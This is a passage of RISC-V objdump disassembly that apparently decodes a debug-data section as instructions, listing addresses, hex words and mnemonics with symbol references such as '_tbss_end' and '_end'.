     25c:	0501                	addi	a0,a0,0
     25e:	0332                	slli	t1,t1,0xc
     260:	00020903          	lb	s2,0(tp) # ffffffffffff8000 <_end+0xffffffff7ffdcb40>
     264:	0501                	addi	a0,a0,0
     266:	0344                	addi	s1,sp,388
     268:	0900                	addi	s0,sp,144
     26a:	000a                	c.slli	zero,0x2
     26c:	0501                	addi	a0,a0,0
     26e:	0312                	slli	t1,t1,0x4
     270:	0900                	addi	s0,sp,144
     272:	0006                	c.slli	zero,0x1
     274:	0501                	addi	a0,a0,0
     276:	0316                	slli	t1,t1,0x5
     278:	0904                	addi	s1,sp,144
     27a:	0006                	c.slli	zero,0x1
     27c:	0501                	addi	a0,a0,0
     27e:	0309                	addi	t1,t1,2
     280:	0900                	addi	s0,sp,144
     282:	0004                	0x4
     284:	0501                	addi	a0,a0,0
     286:	0016                	c.slli	zero,0x5
     288:	0402                	c.slli64	s0
     28a:	09030303          	lb	t1,144(t1)
     28e:	0002                	c.slli64	zero
     290:	0501                	addi	a0,a0,0
     292:	002d                	c.nop	11
     294:	0402                	c.slli64	s0
     296:	09040303          	lb	t1,144(s0) # fffffffffffe0090 <_end+0xffffffff7ffc4bd0>
     29a:	000a                	c.slli	zero,0x2
     29c:	0501                	addi	a0,a0,0
     29e:	0039                	c.nop	14
     2a0:	0402                	c.slli64	s0
     2a2:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     2a6:	000a                	c.slli	zero,0x2
     2a8:	0501                	addi	a0,a0,0
     2aa:	04020013          	addi	zero,tp,64 # 40 <buf.2990>
     2ae:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     2b2:	0006                	c.slli	zero,0x1
     2b4:	0501                	addi	a0,a0,0
     2b6:	002c                	addi	a1,sp,8
     2b8:	0402                	c.slli64	s0
     2ba:	09790303          	lb	t1,151(s2) # 6647 <_tbss_end+0x65c3>
     2be:	0008                	0x8
     2c0:	0501                	addi	a0,a0,0
     2c2:	0009                	c.nop	2
     2c4:	0402                	c.slli64	s0
     2c6:	0301                	addi	t1,t1,0
     2c8:	0900                	addi	s0,sp,144
     2ca:	000a                	c.slli	zero,0x2
     2cc:	0501                	addi	a0,a0,0
     2ce:	002c                	addi	a1,sp,8
     2d0:	0402                	c.slli64	s0
     2d2:	0302                	c.slli64	t1
     2d4:	0979                	addi	s2,s2,30
     2d6:	000a                	c.slli	zero,0x2
     2d8:	0501                	addi	a0,a0,0
     2da:	0005                	c.nop	1
     2dc:	0402                	c.slli64	s0
     2de:	0301                	addi	t1,t1,0
     2e0:	0900                	addi	s0,sp,144
     2e2:	000a                	c.slli	zero,0x2
     2e4:	0501                	addi	a0,a0,0
     2e6:	0301                	addi	t1,t1,0
     2e8:	0912                	slli	s2,s2,0x4
     2ea:	000c                	0xc
     2ec:	0401                	addi	s0,s0,0
     2ee:	0502                	c.slli64	a0
     2f0:	0365                	addi	t1,t1,25
     2f2:	7fa9                	lui	t6,0xfffea
     2f4:	0a09                	addi	s4,s4,2
     2f6:	0100                	addi	s0,sp,128
     2f8:	1405                	addi	s0,s0,-31
     2fa:	16090103          	lb	sp,352(s2)
     2fe:	0100                	addi	s0,sp,128
     300:	1005                	c.nop	-31
     302:	08090103          	lb	sp,128(s2)
     306:	0100                	addi	s0,sp,128
     308:	1405                	addi	s0,s0,-31
     30a:	06090003          	lb	zero,96(s2)
     30e:	0100                	addi	s0,sp,128
     310:	1305                	addi	t1,t1,-31
     312:	04090203          	lb	tp,64(s2)
     316:	0100                	addi	s0,sp,128
     318:	0505                	addi	a0,a0,1
     31a:	04090003          	lb	zero,64(s2)
     31e:	0100                	addi	s0,sp,128
     320:	1405                	addi	s0,s0,-31
     322:	02090103          	lb	sp,32(s2)
     326:	0100                	addi	s0,sp,128
     328:	2505                	addiw	a0,a0,1
     32a:	0e090003          	lb	zero,224(s2)
     32e:	0100                	addi	s0,sp,128
     330:	0c05                	addi	s8,s8,1
     332:	06090003          	lb	zero,96(s2)
     336:	0100                	addi	s0,sp,128
     338:	1805                	addi	a6,a6,-31
     33a:	04090103          	lb	sp,64(s2)
     33e:	0100                	addi	s0,sp,128
     340:	2905                	addiw	s2,s2,1
     342:	06090003          	lb	zero,96(s2)
     346:	0100                	addi	s0,sp,128
     348:	1c05                	addi	s8,s8,-31
     34a:	06090003          	lb	zero,96(s2)
     34e:	0100                	addi	s0,sp,128
     350:	2505                	addiw	a0,a0,1
     352:	02090103          	lb	sp,32(s2)
     356:	0100                	addi	s0,sp,128
     358:	1c05                	addi	s8,s8,-31
     35a:	0e090003          	lb	zero,224(s2)
     35e:	0100                	addi	s0,sp,128
     360:	1805                	addi	a6,a6,-31
     362:	06090103          	lb	sp,96(s2)
     366:	0100                	addi	s0,sp,128
     368:	2905                	addiw	s2,s2,1
     36a:	06090003          	lb	zero,96(s2)
     36e:	0100                	addi	s0,sp,128
     370:	1c05                	addi	s8,s8,-31
     372:	08090003          	lb	zero,128(s2)
     376:	0100                	addi	s0,sp,128
     378:	04090103          	lb	sp,64(s2)
     37c:	0100                	addi	s0,sp,128
     37e:	1905                	addi	s2,s2,-31
     380:	12090203          	lb	tp,288(s2)
     384:	0100                	addi	s0,sp,128
     386:	2a05                	addiw	s4,s4,1
     388:	0e090003          	lb	zero,224(s2)
     38c:	0100                	addi	s0,sp,128
     38e:	1105                	addi	sp,sp,-31
     390:	08090003          	lb	zero,128(s2)
     394:	0100                	addi	s0,sp,128
     396:	2505                	addiw	a0,a0,1
     398:	04090103          	lb	sp,64(s2)
     39c:	0100                	addi	s0,sp,128
     39e:	1805                	addi	a6,a6,-31
     3a0:	0c090003          	lb	zero,192(s2)
     3a4:	0100                	addi	s0,sp,128
     3a6:	2505                	addiw	a0,a0,1
     3a8:	06090003          	lb	zero,96(s2)
     3ac:	0100                	addi	s0,sp,128
     3ae:	1c05                	addi	s8,s8,-31
     3b0:	02090003          	lb	zero,32(s2)
     3b4:	0100                	addi	s0,sp,128
     3b6:	1805                	addi	a6,a6,-31
     3b8:	02090103          	lb	sp,32(s2)
     3bc:	0100                	addi	s0,sp,128
     3be:	1c05                	addi	s8,s8,-31
     3c0:	06090003          	lb	zero,96(s2)
     3c4:	0100                	addi	s0,sp,128
     3c6:	2b05                	addiw	s6,s6,1
     3c8:	0200                	addi	s0,sp,256
     3ca:	0204                	addi	s1,sp,256
     3cc:	0c097703          	0xc097703
     3d0:	0100                	addi	s0,sp,128
     3d2:	0505                	addi	a0,a0,1
     3d4:	0200                	addi	s0,sp,256
     3d6:	0104                	addi	s1,sp,128
     3d8:	0a090003          	lb	zero,160(s2)
     3dc:	0100                	addi	s0,sp,128
     3de:	0105                	addi	sp,sp,1
     3e0:	0c090c03          	lb	s8,192(s2)
     3e4:	0100                	addi	s0,sp,128
     3e6:	1e05                	addi	t3,t3,-31
     3e8:	0a090803          	lb	a6,160(s2)
     3ec:	0100                	addi	s0,sp,128
     3ee:	0d05                	addi	s10,s10,1
     3f0:	0a090103          	lb	sp,160(s2)
     3f4:	0100                	addi	s0,sp,128
     3f6:	1c05                	addi	s8,s8,-31
     3f8:	06090303          	lb	t1,96(s2)
     3fc:	0100                	addi	s0,sp,128
     3fe:	0f05                	addi	t5,t5,1
     400:	0e090003          	lb	zero,224(s2)
     404:	0100                	addi	s0,sp,128
     406:	0505                	addi	a0,a0,1
     408:	0a090103          	lb	sp,160(s2)
     40c:	0100                	addi	s0,sp,128
     40e:	0d05                	addi	s10,s10,1
     410:	34090b03          	lb	s6,832(s2)
     414:	0100                	addi	s0,sp,128
     416:	0805                	addi	a6,a6,1
     418:	0a090003          	lb	zero,160(s2)
     41c:	0100                	addi	s0,sp,128
     41e:	1e05                	addi	t3,t3,-31
     420:	08090103          	lb	sp,128(s2)
     424:	0100                	addi	s0,sp,128
     426:	2405                	addiw	s0,s0,1
     428:	14090003          	lb	zero,320(s2)
     42c:	0100                	addi	s0,sp,128
     42e:	0f05                	addi	t5,t5,1
     430:	06090003          	lb	zero,96(s2)
     434:	0100                	addi	s0,sp,128
     436:	0d05                	addi	s10,s10,1
     438:	12090403          	lb	s0,288(s2)
     43c:	0100                	addi	s0,sp,128
     43e:	0b05                	addi	s6,s6,1
     440:	0c090003          	lb	zero,192(s2)
     444:	0100                	addi	s0,sp,128
     446:	0105                	addi	sp,sp,1
     448:	04090103          	lb	sp,64(s2)
     44c:	0100                	addi	s0,sp,128
     44e:	0f05                	addi	t5,t5,1
     450:	08090203          	lb	tp,128(s2)
     454:	0100                	addi	s0,sp,128
     456:	3205                	addiw	tp,tp,-31
     458:	08090103          	lb	sp,128(s2)
     45c:	0100                	addi	s0,sp,128
     45e:	0e05                	addi	t3,t3,1
     460:	16090003          	lb	zero,352(s2)
     464:	0100                	addi	s0,sp,128
     466:	0d05                	addi	s10,s10,1
     468:	04090203          	lb	tp,64(s2)
     46c:	0100                	addi	s0,sp,128
     46e:	0505                	addi	a0,a0,1
     470:	04090903          	lb	s2,64(s2)
     474:	0100                	addi	s0,sp,128
     476:	0c090103          	lb	sp,192(s2)
     47a:	0100                	addi	s0,sp,128
     47c:	1205                	addi	tp,tp,-31
     47e:	18090303          	lb	t1,384(s2)
     482:	0100                	addi	s0,sp,128
     484:	0505                	addi	a0,a0,1
     486:	04090003          	lb	zero,64(s2)
     48a:	0100                	addi	s0,sp,128
     48c:	1605                	addi	a2,a2,-31
     48e:	02090303          	lb	t1,32(s2)
     492:	0100                	addi	s0,sp,128
     494:	0905                	addi	s2,s2,1
     496:	04090003          	lb	zero,64(s2)
     49a:	0100                	addi	s0,sp,128
     49c:	1b05                	addi	s6,s6,-31
     49e:	0200                	addi	s0,sp,256
     4a0:	0304                	addi	s1,sp,384
     4a2:	02090103          	lb	sp,32(s2)
     4a6:	0100                	addi	s0,sp,128
     4a8:	2c05                	addiw	s8,s8,1
     4aa:	0200                	addi	s0,sp,256
     4ac:	0304                	addi	s1,sp,384
     4ae:	14097f03          	0x14097f03
     4b2:	0100                	addi	s0,sp,128
     4b4:	0905                	addi	s2,s2,1
     4b6:	0200                	addi	s0,sp,256
     4b8:	0104                	addi	s1,sp,128
     4ba:	0a090003          	lb	zero,160(s2)
     4be:	0100                	addi	s0,sp,128
     4c0:	1605                	addi	a2,a2,-31
     4c2:	0c090503          	lb	a0,192(s2)
     4c6:	0100                	addi	s0,sp,128
     4c8:	0905                	addi	s2,s2,1
     4ca:	04090003          	lb	zero,64(s2)
     4ce:	0100                	addi	s0,sp,128
     4d0:	0d05                	addi	s10,s10,1
     4d2:	02090303          	lb	t1,32(s2)
     4d6:	0100                	addi	s0,sp,128
     4d8:	1905                	addi	s2,s2,-31
     4da:	10090203          	lb	tp,256(s2)
     4de:	0100                	addi	s0,sp,128
     4e0:	0d05                	addi	s10,s10,1
     4e2:	06090003          	lb	zero,96(s2)
     4e6:	0100                	addi	s0,sp,128
     4e8:	2405                	addiw	s0,s0,1
     4ea:	02090503          	lb	a0,32(s2)
     4ee:	0100                	addi	s0,sp,128
     4f0:	1905                	addi	s2,s2,-31
     4f2:	0a090003          	lb	zero,160(s2)
     4f6:	0100                	addi	s0,sp,128
     4f8:	2105                	addiw	sp,sp,1
     4fa:	0c090103          	lb	sp,192(s2)
     4fe:	0100                	addi	s0,sp,128
     500:	3405                	addiw	s0,s0,-31
     502:	0a090003          	lb	zero,160(s2)
     506:	0100                	addi	s0,sp,128
     508:	3905                	addiw	s2,s2,-31
     50a:	02090003          	lb	zero,32(s2)
     50e:	0100                	addi	s0,sp,128
     510:	1b05                	addi	s6,s6,-31
     512:	02090003          	lb	zero,32(s2)
     516:	0100                	addi	s0,sp,128
     518:	3505                	addiw	a0,a0,-31
     51a:	08090103          	lb	sp,128(s2)
     51e:	0100                	addi	s0,sp,128
     520:	1b05                	addi	s6,s6,-31
     522:	06090003          	lb	zero,96(s2)
     526:	0100                	addi	s0,sp,128
     528:	3f05                	addiw	t5,t5,-31
     52a:	0a090103          	lb	sp,160(s2)
     52e:	0100                	addi	s0,sp,128
     530:	3205                	addiw	tp,tp,-31
     532:	0a090003          	lb	zero,160(s2)
     536:	0100                	addi	s0,sp,128
     538:	1b05                	addi	s6,s6,-31
     53a:	06090003          	lb	zero,96(s2)
     53e:	0100                	addi	s0,sp,128
     540:	1e05                	addi	t3,t3,-31
     542:	0a090303          	lb	t1,160(s2)
     546:	0100                	addi	s0,sp,128
     548:	1105                	addi	sp,sp,-31
     54a:	04090003          	lb	zero,64(s2)
     54e:	0100                	addi	s0,sp,128
     550:	1505                	addi	a0,a0,-31
     552:	0200                	addi	s0,sp,256
     554:	0304                	addi	s1,sp,384
     556:	02090103          	lb	sp,32(s2)
     55a:	0100                	addi	s0,sp,128
     55c:	2e05                	addiw	t3,t3,1
     55e:	0200                	addi	s0,sp,256
     560:	0304                	addi	s1,sp,384
     562:	00097f03          	0x97f03
     566:	0100                	addi	s0,sp,128
     568:	1105                	addi	sp,sp,-31
     56a:	0200                	addi	s0,sp,256
     56c:	0104                	addi	s1,sp,128
     56e:	0a090003          	lb	zero,160(s2)
     572:	0100                	addi	s0,sp,128
     574:	0200                	addi	s0,sp,256
     576:	0204                	addi	s1,sp,256
     578:	0c090503          	lb	a0,192(s2)
     57c:	0100                	addi	s0,sp,128
     57e:	4105                	li	sp,1
     580:	0200                	addi	s0,sp,256
     582:	0204                	addi	s1,sp,256
     584:	08097003          	0x8097003
     588:	0100                	addi	s0,sp,128
     58a:	0d05                	addi	s10,s10,1
     58c:	0200                	addi	s0,sp,256
     58e:	0104                	addi	s1,sp,128
     590:	0a090003          	lb	zero,160(s2)
     594:	0100                	addi	s0,sp,128
     596:	1b05                	addi	s6,s6,-31
     598:	08091703          	lh	a4,128(s2)
     59c:	0100                	addi	s0,sp,128
     59e:	0d05                	addi	s10,s10,1
     5a0:	04090003          	lb	zero,64(s2)
     5a4:	0100                	addi	s0,sp,128
     5a6:	1b05                	addi	s6,s6,-31
     5a8:	02090103          	lb	sp,32(s2)
     5ac:	0100                	addi	s0,sp,128
     5ae:	1905                	addi	s2,s2,-31
     5b0:	04090103          	lb	sp,64(s2)
     5b4:	0100                	addi	s0,sp,128
     5b6:	1705                	addi	a4,a4,-31
     5b8:	0c090003          	lb	zero,192(s2)
     5bc:	0100                	addi	s0,sp,128
     5be:	2305                	addiw	t1,t1,1
     5c0:	04090103          	lb	sp,64(s2)
     5c4:	0100                	addi	s0,sp,128
     5c6:	2005                	0x2005
     5c8:	06090003          	lb	zero,96(s2)
     5cc:	0100                	addi	s0,sp,128
     5ce:	1705                	addi	a4,a4,-31
     5d0:	0e090003          	lb	zero,224(s2)
     5d4:	0100                	addi	s0,sp,128
     5d6:	1905                	addi	s2,s2,-31
     5d8:	0a090103          	lb	sp,160(s2)
     5dc:	0100                	addi	s0,sp,128
     5de:	1605                	addi	a2,a2,-31
     5e0:	0c090003          	lb	zero,192(s2)
     5e4:	0100                	addi	s0,sp,128
     5e6:	1405                	addi	s0,s0,-31
     5e8:	0c090303          	lb	t1,192(s2)
     5ec:	0100                	addi	s0,sp,128
     5ee:	2005                	0x2005
     5f0:	0c090103          	lb	sp,192(s2)
     5f4:	0100                	addi	s0,sp,128
     5f6:	2b05                	addiw	s6,s6,1
     5f8:	0200                	addi	s0,sp,256
     5fa:	0204                	addi	s1,sp,256
     5fc:	28097803          	0x28097803
     600:	0100                	addi	s0,sp,128
     602:	0d05                	addi	s10,s10,1
     604:	0200                	addi	s0,sp,256
     606:	0104                	addi	s1,sp,128
     608:	0a090003          	lb	zero,160(s2)
     60c:	0100                	addi	s0,sp,128
     60e:	4305                	li	t1,1
     610:	0200                	addi	s0,sp,256
     612:	0204                	addi	s1,sp,256
     614:	0c096403          	lwu	s0,192(s2)
     618:	0100                	addi	s0,sp,128
     61a:	0905                	addi	s2,s2,1
     61c:	0200                	addi	s0,sp,256
     61e:	0104                	addi	s1,sp,128
     620:	0a090003          	lb	zero,160(s2)
     624:	0100                	addi	s0,sp,128
     626:	0a092e03          	lw	t3,160(s2)
     62a:	0100                	addi	s0,sp,128
     62c:	1205                	addi	tp,tp,-31
     62e:	1c090203          	lb	tp,448(s2)
     632:	0100                	addi	s0,sp,128
     634:	2a05                	addiw	s4,s4,1
     636:	04090003          	lb	zero,64(s2)
     63a:	0100                	addi	s0,sp,128
     63c:	1605                	addi	a2,a2,-31
     63e:	10090003          	lb	zero,256(s2)
     642:	0100                	addi	s0,sp,128
     644:	0b05                	addi	s6,s6,1
     646:	04090003          	lb	zero,64(s2)
     64a:	0100                	addi	s0,sp,128
     64c:	3905                	addiw	s2,s2,-31
     64e:	0200                	addi	s0,sp,256
     650:	0104                	addi	s1,sp,128
     652:	06090003          	lb	zero,96(s2)
     656:	0100                	addi	s0,sp,128
     658:	5105                	li	sp,-31
     65a:	0200                	addi	s0,sp,256
     65c:	0104                	addi	s1,sp,128
     65e:	04090003          	lb	zero,64(s2)
     662:	0100                	addi	s0,sp,128
     664:	3d05                	addiw	s10,s10,-31
     666:	0200                	addi	s0,sp,256
     668:	0104                	addi	s1,sp,128
     66a:	10090003          	lb	zero,256(s2)
     66e:	0100                	addi	s0,sp,128
     670:	3005                	0x3005
     672:	0200                	addi	s0,sp,256
     674:	0104                	addi	s1,sp,128
     676:	04090003          	lb	zero,64(s2)
     67a:	0100                	addi	s0,sp,128
     67c:	0905                	addi	s2,s2,1
     67e:	06090103          	lb	sp,96(s2)
     682:	0100                	addi	s0,sp,128
     684:	3505                	addiw	a0,a0,-31
     686:	10090103          	lb	sp,256(s2)
     68a:	0100                	addi	s0,sp,128
     68c:	0905                	addi	s2,s2,1
     68e:	14097f03          	0x14097f03
     692:	0100                	addi	s0,sp,128
     694:	4f05                	li	t5,1
     696:	08090103          	lb	sp,128(s2)
     69a:	0100                	addi	s0,sp,128
     69c:	0905                	addi	s2,s2,1
     69e:	04097f03          	0x4097f03
     6a2:	0100                	addi	s0,sp,128
     6a4:	5a05                	li	s4,-31
     6a6:	04090103          	lb	sp,64(s2)
     6aa:	0100                	addi	s0,sp,128
     6ac:	0905                	addi	s2,s2,1
     6ae:	04097f03          	0x4097f03
     6b2:	0100                	addi	s0,sp,128
     6b4:	4f05                	li	t5,1
     6b6:	08090203          	lb	tp,128(s2)
     6ba:	0100                	addi	s0,sp,128
     6bc:	0905                	addi	s2,s2,1
     6be:	04097e03          	0x4097e03
     6c2:	0100                	addi	s0,sp,128
     6c4:	5a05                	li	s4,-31
     6c6:	04090203          	lb	tp,64(s2)
     6ca:	0100                	addi	s0,sp,128
     6cc:	0905                	addi	s2,s2,1
     6ce:	04097e03          	0x4097e03
     6d2:	0100                	addi	s0,sp,128
     6d4:	14090403          	lb	s0,320(s2)
     6d8:	0100                	addi	s0,sp,128
     6da:	3505                	addiw	a0,a0,-31
     6dc:	10090103          	lb	sp,256(s2)
     6e0:	0100                	addi	s0,sp,128
     6e2:	0905                	addi	s2,s2,1
     6e4:	14097f03          	0x14097f03
     6e8:	0100                	addi	s0,sp,128
     6ea:	4f05                	li	t5,1
     6ec:	08090103          	lb	sp,128(s2)
     6f0:	0100                	addi	s0,sp,128
     6f2:	0905                	addi	s2,s2,1
     6f4:	04097f03          	0x4097f03
     6f8:	0100                	addi	s0,sp,128
     6fa:	5a05                	li	s4,-31
     6fc:	04090103          	lb	sp,64(s2)
     700:	0100                	addi	s0,sp,128
     702:	0905                	addi	s2,s2,1
     704:	04097f03          	0x4097f03
     708:	0100                	addi	s0,sp,128
     70a:	4f05                	li	t5,1
     70c:	08090203          	lb	tp,128(s2)
     710:	0100                	addi	s0,sp,128
     712:	0905                	addi	s2,s2,1
     714:	04097e03          	0x4097e03
     718:	0100                	addi	s0,sp,128
     71a:	5a05                	li	s4,-31
     71c:	04090203          	lb	tp,64(s2)
     720:	0100                	addi	s0,sp,128
     722:	0905                	addi	s2,s2,1
     724:	04097e03          	0x4097e03
     728:	0100                	addi	s0,sp,128
     72a:	0200                	addi	s0,sp,256
     72c:	0204                	addi	s1,sp,256
     72e:	12090503          	lb	a0,288(s2)
     732:	0100                	addi	s0,sp,128
     734:	2c05                	addiw	s8,s8,1
     736:	0200                	addi	s0,sp,256
     738:	0204                	addi	s1,sp,256
     73a:	097fbe03          	ld	t3,151(t6) # fffffffffffea097 <_end+0xffffffff7ffcebd7>
     73e:	000a                	c.slli	zero,0x2
     740:	0501                	addi	a0,a0,0
     742:	0005                	c.nop	1
     744:	0402                	c.slli64	s0
     746:	0301                	addi	t1,t1,0
     748:	0900                	addi	s0,sp,144
     74a:	000a                	c.slli	zero,0x2
     74c:	0501                	addi	a0,a0,0
     74e:	030c                	addi	a1,sp,384
     750:	00c5                	addi	ra,ra,17
     752:	0a09                	addi	s4,s4,2
     754:	0100                	addi	s0,sp,128
     756:	0105                	addi	sp,sp,1
     758:	02090103          	lb	sp,32(s2)
     75c:	0100                	addi	s0,sp,128
     75e:	0a09                	addi	s4,s4,2
     760:	0000                	unimp
     762:	0101                	addi	sp,sp,0
     764:	03f4                	addi	a3,sp,460
     766:	0000                	unimp
     768:	00200003          	lb	zero,2(zero) # 2 <_tdata_begin+0x2>
     76c:	0000                	unimp
     76e:	0101                	addi	sp,sp,0
     770:	000d0efb          	0xd0efb
     774:	0101                	addi	sp,sp,0
     776:	0101                	addi	sp,sp,0
     778:	0000                	unimp
     77a:	0100                	addi	s0,sp,128
     77c:	0000                	unimp
     77e:	7301                	lui	t1,0xfffe0
     780:	6372                	ld	t1,280(sp)
     782:	0000                	unimp
     784:	2e747263          	bgeu	s0,t2,a68 <_tbss_end+0x9e4>
     788:	00010053          	fadd.s	ft0,ft2,ft0,rne
     78c:	0000                	unimp
     78e:	0900                	addi	s0,sp,144
     790:	0002                	c.slli64	zero
     792:	0000                	unimp
     794:	0080                	addi	s0,sp,64
     796:	0000                	unimp
     798:	0300                	addi	s0,sp,384
     79a:	0111                	addi	sp,sp,4
     79c:	02090103          	lb	sp,32(s2)
     7a0:	0100                	addi	s0,sp,128
     7a2:	02090103          	lb	sp,32(s2)
     7a6:	0100                	addi	s0,sp,128
     7a8:	02090103          	lb	sp,32(s2)
     7ac:	0100                	addi	s0,sp,128
     7ae:	02090103          	lb	sp,32(s2)
     7b2:	0100                	addi	s0,sp,128
     7b4:	02090103          	lb	sp,32(s2)
     7b8:	0100                	addi	s0,sp,128
     7ba:	02090103          	lb	sp,32(s2)
     7be:	0100                	addi	s0,sp,128
     7c0:	02090103          	lb	sp,32(s2)
     7c4:	0100                	addi	s0,sp,128
     7c6:	02090103          	lb	sp,32(s2)
     7ca:	0100                	addi	s0,sp,128
     7cc:	02090103          	lb	sp,32(s2)
     7d0:	0100                	addi	s0,sp,128
     7d2:	02090103          	lb	sp,32(s2)
     7d6:	0100                	addi	s0,sp,128
     7d8:	02090103          	lb	sp,32(s2)
     7dc:	0100                	addi	s0,sp,128
     7de:	02090103          	lb	sp,32(s2)
     7e2:	0100                	addi	s0,sp,128
     7e4:	02090103          	lb	sp,32(s2)
     7e8:	0100                	addi	s0,sp,128
     7ea:	02090103          	lb	sp,32(s2)
     7ee:	0100                	addi	s0,sp,128
     7f0:	02090103          	lb	sp,32(s2)
     7f4:	0100                	addi	s0,sp,128
     7f6:	02090103          	lb	sp,32(s2)
     7fa:	0100                	addi	s0,sp,128
     7fc:	02090103          	lb	sp,32(s2)
     800:	0100                	addi	s0,sp,128
     802:	02090103          	lb	sp,32(s2)
     806:	0100                	addi	s0,sp,128
     808:	02090103          	lb	sp,32(s2)
     80c:	0100                	addi	s0,sp,128
     80e:	02090103          	lb	sp,32(s2)
     812:	0100                	addi	s0,sp,128
     814:	02090103          	lb	sp,32(s2)
     818:	0100                	addi	s0,sp,128
     81a:	02090103          	lb	sp,32(s2)
     81e:	0100                	addi	s0,sp,128
     820:	02090103          	lb	sp,32(s2)
     824:	0100                	addi	s0,sp,128
     826:	02090103          	lb	sp,32(s2)
     82a:	0100                	addi	s0,sp,128
     82c:	02090103          	lb	sp,32(s2)
     830:	0100                	addi	s0,sp,128
     832:	02090103          	lb	sp,32(s2)
     836:	0100                	addi	s0,sp,128
     838:	02090103          	lb	sp,32(s2)
     83c:	0100                	addi	s0,sp,128
     83e:	02090103          	lb	sp,32(s2)
     842:	0100                	addi	s0,sp,128
     844:	02090103          	lb	sp,32(s2)
     848:	0100                	addi	s0,sp,128
     84a:	02090103          	lb	sp,32(s2)
     84e:	0100                	addi	s0,sp,128
     850:	02090303          	lb	t1,32(s2)
     854:	0100                	addi	s0,sp,128
     856:	02090103          	lb	sp,32(s2)
     85a:	0100                	addi	s0,sp,128
     85c:	04090303          	lb	t1,64(s2)
     860:	0100                	addi	s0,sp,128
     862:	02090203          	lb	tp,32(s2)
     866:	0100                	addi	s0,sp,128
     868:	02090303          	lb	t1,32(s2)
     86c:	0100                	addi	s0,sp,128
     86e:	04090603          	lb	a2,64(s2)
     872:	0100                	addi	s0,sp,128
     874:	02090103          	lb	sp,32(s2)
     878:	0100                	addi	s0,sp,128
     87a:	08090103          	lb	sp,128(s2)
     87e:	0100                	addi	s0,sp,128
     880:	02090403          	lb	s0,32(s2)
     884:	0100                	addi	s0,sp,128
     886:	08090303          	lb	t1,128(s2)
     88a:	0100                	addi	s0,sp,128
     88c:	04090303          	lb	t1,64(s2)
     890:	0100                	addi	s0,sp,128
     892:	04090203          	lb	tp,64(s2)
     896:	0100                	addi	s0,sp,128
     898:	04090103          	lb	sp,64(s2)
     89c:	0100                	addi	s0,sp,128
     89e:	04090103          	lb	sp,64(s2)
     8a2:	0100                	addi	s0,sp,128
     8a4:	04090103          	lb	sp,64(s2)
     8a8:	0100                	addi	s0,sp,128
     8aa:	04090103          	lb	sp,64(s2)
     8ae:	0100                	addi	s0,sp,128
     8b0:	04090103          	lb	sp,64(s2)
     8b4:	0100                	addi	s0,sp,128
     8b6:	04090103          	lb	sp,64(s2)
     8ba:	0100                	addi	s0,sp,128
     8bc:	04090103          	lb	sp,64(s2)
     8c0:	0100                	addi	s0,sp,128
     8c2:	04090103          	lb	sp,64(s2)
     8c6:	0100                	addi	s0,sp,128
     8c8:	04090103          	lb	sp,64(s2)
     8cc:	0100                	addi	s0,sp,128
     8ce:	04090103          	lb	sp,64(s2)
     8d2:	0100                	addi	s0,sp,128
     8d4:	04090103          	lb	sp,64(s2)
     8d8:	0100                	addi	s0,sp,128
     8da:	04090103          	lb	sp,64(s2)
     8de:	0100                	addi	s0,sp,128
     8e0:	04090103          	lb	sp,64(s2)
     8e4:	0100                	addi	s0,sp,128
     8e6:	04090103          	lb	sp,64(s2)
     8ea:	0100                	addi	s0,sp,128
     8ec:	04090103          	lb	sp,64(s2)
     8f0:	0100                	addi	s0,sp,128
     8f2:	04090103          	lb	sp,64(s2)
     8f6:	0100                	addi	s0,sp,128
     8f8:	04090103          	lb	sp,64(s2)
     8fc:	0100                	addi	s0,sp,128
     8fe:	04090103          	lb	sp,64(s2)
     902:	0100                	addi	s0,sp,128
     904:	04090103          	lb	sp,64(s2)
     908:	0100                	addi	s0,sp,128
     90a:	04090103          	lb	sp,64(s2)
     90e:	0100                	addi	s0,sp,128
     910:	04090103          	lb	sp,64(s2)
     914:	0100                	addi	s0,sp,128
     916:	04090103          	lb	sp,64(s2)
     91a:	0100                	addi	s0,sp,128
     91c:	04090103          	lb	sp,64(s2)
     920:	0100                	addi	s0,sp,128
     922:	04090103          	lb	sp,64(s2)
     926:	0100                	addi	s0,sp,128
     928:	04090103          	lb	sp,64(s2)
     92c:	0100                	addi	s0,sp,128
     92e:	04090103          	lb	sp,64(s2)
     932:	0100                	addi	s0,sp,128
     934:	04090103          	lb	sp,64(s2)
     938:	0100                	addi	s0,sp,128
     93a:	04090103          	lb	sp,64(s2)
     93e:	0100                	addi	s0,sp,128
     940:	04090103          	lb	sp,64(s2)
     944:	0100                	addi	s0,sp,128
     946:	04090103          	lb	sp,64(s2)
     94a:	0100                	addi	s0,sp,128
     94c:	04090103          	lb	sp,64(s2)
     950:	0100                	addi	s0,sp,128
     952:	04090503          	lb	a0,64(s2)
     956:	0100                	addi	s0,sp,128
     958:	08090103          	lb	sp,128(s2)
     95c:	0100                	addi	s0,sp,128
     95e:	04090503          	lb	a0,64(s2)
     962:	0100                	addi	s0,sp,128
     964:	08090403          	lb	s0,128(s2)
     968:	0100                	addi	s0,sp,128
     96a:	08090103          	lb	sp,128(s2)
     96e:	0100                	addi	s0,sp,128
     970:	04090303          	lb	t1,64(s2)
     974:	0100                	addi	s0,sp,128
     976:	04090203          	lb	tp,64(s2)
     97a:	0100                	addi	s0,sp,128
     97c:	02090203          	lb	tp,32(s2)
     980:	0100                	addi	s0,sp,128
     982:	04090403          	lb	s0,64(s2)
     986:	0100                	addi	s0,sp,128
     988:	04090103          	lb	sp,64(s2)
     98c:	0100                	addi	s0,sp,128
     98e:	02090103          	lb	sp,32(s2)
     992:	0100                	addi	s0,sp,128
     994:	04090103          	lb	sp,64(s2)
     998:	0100                	addi	s0,sp,128
     99a:	02090103          	lb	sp,32(s2)
     99e:	0100                	addi	s0,sp,128
     9a0:	02090203          	lb	tp,32(s2)
     9a4:	0100                	addi	s0,sp,128
     9a6:	04090403          	lb	s0,64(s2)
     9aa:	0100                	addi	s0,sp,128
     9ac:	02090303          	lb	t1,32(s2)
     9b0:	0100                	addi	s0,sp,128
     9b2:	02090103          	lb	sp,32(s2)
     9b6:	0100                	addi	s0,sp,128
     9b8:	02090103          	lb	sp,32(s2)
     9bc:	0100                	addi	s0,sp,128
     9be:	02090103          	lb	sp,32(s2)
     9c2:	0100                	addi	s0,sp,128
     9c4:	02090103          	lb	sp,32(s2)
     9c8:	0100                	addi	s0,sp,128
     9ca:	02090103          	lb	sp,32(s2)
     9ce:	0100                	addi	s0,sp,128
     9d0:	02090103          	lb	sp,32(s2)
